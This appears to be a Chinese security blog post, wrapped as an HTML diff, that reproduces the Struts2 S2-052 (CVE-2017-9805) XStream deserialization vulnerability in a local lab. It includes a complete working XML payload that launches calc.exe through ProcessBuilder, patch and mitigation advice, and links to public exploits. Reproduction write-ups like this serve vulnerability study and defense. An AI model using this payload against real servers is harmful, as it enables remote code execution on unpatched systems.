@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>struts2-052漏洞复现</title>
+    <meta name="description" content="Apache Struts2的REST插件存在远程代码执行的高危漏洞，该漏洞由lgtm.com的安全研究员汇报，漏洞编号为CVE-2017-9805（S2-052）。Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效...">
+
+    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
+    <link rel="stylesheet" href="/css/main.css ">
+    <link rel="canonical" href="http://localhost:4000/2017/09/11/struts2-052/">
+    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">
+
+
+    <script>
+    // 百度统计代码
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+
+    <script>
+    // google analytics
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-111240288-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+
+
+</head>
+
+
+  <body>
+
+    <header id="top">
+    <div class="wrapper">
+        <a href="/" class="brand">Jirairya</a>
+        <small></small>
+        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
+        <nav id="headerNav">
+            <ul>
+                <li>
+                    
+                    <a href="/">
+                    
+                        <i class="fa fa-home"></i>Home
+                    </a>
+                </li>
+
+                
+                    
+                    <li>
+                        
+                        <a href="/archive/">
+                        
+                            <i class="fa fa-archive"></i>Archives
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/category/">
+                        
+                            <i class="fa fa-th-list"></i>Categories
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tag/">
+                        
+                            <i class="fa fa-tags"></i>Tags
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/collections/">
+                        
+                            <i class="fa fa-folder-open"></i>Collections
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/skills/">
+                        
+                            <i class="fa fa-bezier-curve"></i>Skills
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tools/">
+                        
+                            <i class="fa fa-toolbox"></i>Tools
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/about/">
+                        
+                            <i class="fa fa-paper-plane"></i>About
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="page clearfix" post>
+    <div class="left">
+        <h1>struts2-052漏洞复现</h1>
+        <div class="label">
+
+            <div class="label-card">
+                <i class="fa fa-calendar"></i>2017-09-11
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+            
+
+
+<!-- <span class="point">•</span> -->
+<span class="categories">
+  <i class="fa fa-th-list"></i>
+  
+    
+        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
+    
+        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>
+    
+  
+
+  <!-- <span class="point">•</span> -->
+</span>
+
+
+            </div>
+
+            <div class="label-card">
+            
+<!-- <span class="point">•</span> -->
+<span class="pageTag">
+  <i class="fa fa-tags"></i>
+  
+    
+        <!--a href="/tag/#struts2" title="Tag: struts2" rel="tag">struts2</a-->
+        <a href="/tag/#struts2" title="Tag: struts2" rel="tag">struts2</a>&nbsp;
+    
+        <!--a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a-->
+        <a href="/tag/#hack" title="Tag: hack" rel="tag">hack</a>
+    
+  
+
+</span>
+
+            </div>
+
+        </div>
+        <hr>
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+        <p>Apache Struts2的REST插件存在远程代码执行的高危漏洞，该漏洞由lgtm.com的安全研究员汇报，漏洞编号为CVE-2017-9805（S2-052）。Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。</p>
+
+<ul id="markdown-toc">
+  <li><a href="#环境" id="markdown-toc-环境">环境</a>    <ul>
+      <li><a href="#准备环境" id="markdown-toc-准备环境">准备环境</a></li>
+      <li><a href="#启动tomcat" id="markdown-toc-启动tomcat">启动tomcat</a></li>
+    </ul>
+  </li>
+  <li><a href="#漏洞poc复现" id="markdown-toc-漏洞poc复现">漏洞POC复现</a>    <ul>
+      <li><a href="#打开burpsuit设置代理" id="markdown-toc-打开burpsuit设置代理">打开burpsuit，设置代理</a></li>
+      <li><a href="#使用poc复现" id="markdown-toc-使用poc复现">使用POC复现</a></li>
+    </ul>
+  </li>
+  <li><a href="#修复建议" id="markdown-toc-修复建议">修复建议</a></li>
+  <li><a href="#exp" id="markdown-toc-exp">EXP</a></li>
+</ul>
+
+<!--more-->
+
+<h2 id="环境">环境</h2>
+
+<h3 id="准备环境">准备环境</h3>
+
+<p>使用XAMPP套件中自带的tomcat进行struts环境部署</p>
+
+<p>漏洞环境直接使用struts2.5.12包中的样例包搭建，直接下载 <a href="">struts-2.5.12-apps.zip 包</a>（http://mirror.bit.edu.cn/apache/struts/2.5.12/struts-2.5.12-apps.zip），放于tomcat的webapps目录之下，打开tomcat，该war包自动部署</p>
+
+<p>下载链接：http://mirror.bit.edu.cn/apache/struts/2.5.12/</p>
+
+<h3 id="启动tomcat">启动tomcat</h3>
+
+<p><img src="/img/hack/vulnerability/struts2-052/xammp%E5%90%AF%E5%8A%A8tomcat.png" alt="XAMPP启动tomcat" /></p>
+
+<p><img src="/img/hack/vulnerability/struts2-052/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%AE%8C%E6%88%90.png" alt="环境搭建完成" /></p>
+
+<h2 id="漏洞poc复现">漏洞POC复现</h2>
+
+<h3 id="打开burpsuit设置代理">打开burpsuit，设置代理</h3>
+
+<p>打开burpsuite抓包工具，开启浏览器代理设置。</p>
+
+<p><img src="/img/hack/vulnerability/struts2-052/%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86.png" alt="设置代理" /></p>
+
+<h3 id="使用poc复现">使用POC复现</h3>
+
+<p>点击页面的view，进入到一个表单数据提交页面，BP抓取到的post包，在其中构造POC，并forward：</p>
+
+<p><img src="/img/hack/vulnerability/struts2-052/%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8.png" alt="弹出计算器" /></p>
+
+<p>POC:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">map</span><span class="o">&gt;</span> 
+<span class="o">&lt;</span><span class="n">entry</span><span class="o">&gt;</span> 
+<span class="o">&lt;</span><span class="n">jdk</span><span class="o">.</span><span class="na">nashorn</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">objects</span><span class="o">.</span><span class="na">NativeString</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">flags</span><span class="o">&gt;</span><span class="mi">0</span><span class="o">&lt;/</span><span class="n">flags</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">value</span> <span class="kd">class</span><span class="err">="</span><span class="nc">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">bind</span><span class="o">.</span><span class="na">v2</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">unmarshaller</span><span class="o">.</span><span class="na">Base64Data</span><span class="s">"&gt; &lt;dataHandler&gt; &lt;dataSource class="</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">ws</span><span class="o">.</span><span class="na">encoding</span><span class="o">.</span><span class="na">xml</span><span class="o">.</span><span class="na">XMLMessage</span><span class="n">$XmlDataSource</span><span class="s">"&gt; &lt;is class="</span><span class="n">javax</span><span class="o">.</span><span class="na">crypto</span><span class="o">.</span><span class="na">CipherInputStream</span><span class="s">"&gt; &lt;cipher class="</span><span class="n">javax</span><span class="o">.</span><span class="na">crypto</span><span class="o">.</span><span class="na">NullCipher</span><span class="s">"&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class="</span><span class="n">javax</span><span class="o">.</span><span class="na">imageio</span><span class="o">.</span><span class="na">spi</span><span class="o">.</span><span class="na">FilterIterator</span><span class="s">"&gt; &lt;iter class="</span><span class="n">javax</span><span class="o">.</span><span class="na">imageio</span><span class="o">.</span><span class="na">spi</span><span class="o">.</span><span class="na">FilterIterator</span><span class="s">"&gt; &lt;iter class="</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Collections</span><span class="n">$EmptyIterator</span><span class="s">"/&gt; &lt;next class="</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ProcessBuilder</span><span class="s">"&gt; &lt;command&gt; &lt;string&gt;calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class="</span><span class="n">javax</span><span class="o">.</span><span class="na">imageio</span><span class="o">.</span><span class="na">ImageIO</span><span class="n">$ContainsFilter</span><span class="s">"&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class="</span><span class="n">string</span><span class="s">"&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class="</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ProcessBuilder</span><span class="n">$NullInputStream</span><span class="s">"/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference="</span><span class="o">../</span><span class="n">jdk</span><span class="o">.</span><span class="na">nashorn</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">objects</span><span class="o">.</span><span class="na">NativeString</span><span class="s">"/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference="</span><span class="o">../../</span><span class="n">entry</span><span class="o">/</span><span class="n">jdk</span><span class="o">.</span><span class="na">nashorn</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">objects</span><span class="o">.</span><span class="na">NativeString</span><span class="s">"/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference="</span><span class="o">../../</span><span class="n">entry</span><span class="o">/</span><span class="n">jdk</span><span class="o">.</span><span class="na">nashorn</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">objects</span><span class="o">.</span><span class="na">NativeString</span><span class="err">"</span><span class="o">/&gt;</span> 
+<span class="o">&lt;/</span><span class="n">entry</span><span class="o">&gt;</span> 
+<span class="o">&lt;/</span><span class="n">map</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="修复建议">修复建议</h2>
+
+<ol>
+  <li>建议尽快升级到 2.5.13或 Struts 2.3.34版本： 
+https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.13 
+https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.34</li>
+  <li>在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs：</li>
+  <li>限制服务器端扩展类型，删除XML支持。</li>
+</ol>
+
+<h2 id="exp">EXP</h2>
+
+<p><a href="https://github.com/luc10/struts-rce-cve-2017-9805">struts2_052 GO语言EXP</a>:https://github.com/luc10/struts-rce-cve-2017-9805</p>
+
+<p><a href="https://github.com/rapid7/metasploit-framework/pull/8924/files">struts2_052 msf exp</a>:https://github.com/rapid7/metasploit-framework/pull/8924/files</p>
+
+
+        </article>
+        <hr>
+
+        
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                        
+                        <h2 id="similar_posts">Similar Posts</h2>
+                        <ul>
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/30/exploit-domain/">域渗透的整理
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+            
+        
+        
+            </ul>
+        
+
+        <div class="post-recent">
+    <div class="pre">
+        
+        <p><strong>上一篇</strong> <a href="/2017/09/11/poison-lvy-torjan/">Payment_Advice.ppsx</a></p>
+        
+    </div>
+    <div class="nex">
+
+        
+        <p><strong>下一篇</strong> <a href="/2017/09/13/DKMC/">DKMC</a></p>
+        
+    </div>
+</div>
+
+
+        <h2 id="comments">Comments</h2>
+        
+
+
+<div id="disqus_thread"></div>
+<script>
+    /**
+     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+
+    var disqus_config = function() {
+        this.page.url = 'http://localhost:4000/2017/09/11/struts2-052/'; // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://localhost:4000/2017/09/11/struts2-052/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document,
+            s = d.createElement('script');
+
+        s.src = '//http-b404-xyz.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+    </div>
+    <button class="anchor"><i class="fa fa-anchor"></i></button>
+    <div class="right">
+        <div class="wrap">
+
+            <!-- Content -->
+            <div class="side content">
+                <div>
+                    Content
+                </div>
+                <ul id="content-side" class="content-ul">
+                    
+                    <li><a href="#similar_posts">Similar Posts</a></li>
+                    
+                    <li><a href="#comments">Comments</a></li>
+                </ul>
+            </div>
+            <!-- 其他div框放到这里 -->
+            <!-- <div class="side">bbbb</div> -->
+        </div>
+    </div>
+</div>
+<script>
+/**
+ * target _blank
+ */
+(function() {
+    var aTags = document.querySelectorAll('article a:not([id])')
+    for (var i = 0; i < aTags.length; i++) {
+        aTags[i].setAttribute('target', '_blank')
+    }
+}());
+</script>
+<script src="/js/pageContent.js " charset="utf-8"></script>
+
+
+    <footer class="site-footer">
+
+
+    <div class="wrapper">
+
+        <p class="description">
+             The quieter you become, the more you can hear. 
+        </p>
+
+        <br>
+        <p class="contact">
+             
+            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
+            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
+            
+        </p>
+        <!--
+        <p>
+            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        </p>
+    -->
+        <p class="power">
+            <span>
+                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
+            </span>
+        </p>
+    </div>
+</footer>
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <div class="back-to-top">
+    <a href="#top" data-scroll>
+        <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    </a>
+</div>
+
+    <script src=" /js/main.js " charset="utf-8"></script>
+    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
+    <script type="text/javascript">
+      smoothScroll.init({
+        speed: 500, // Integer. How fast to complete the scroll in milliseconds
+        easing: 'easeInOutCubic', // Easing pattern to use
+        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
+      });
+    </script>
+    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
+  </body>
+
+</html>
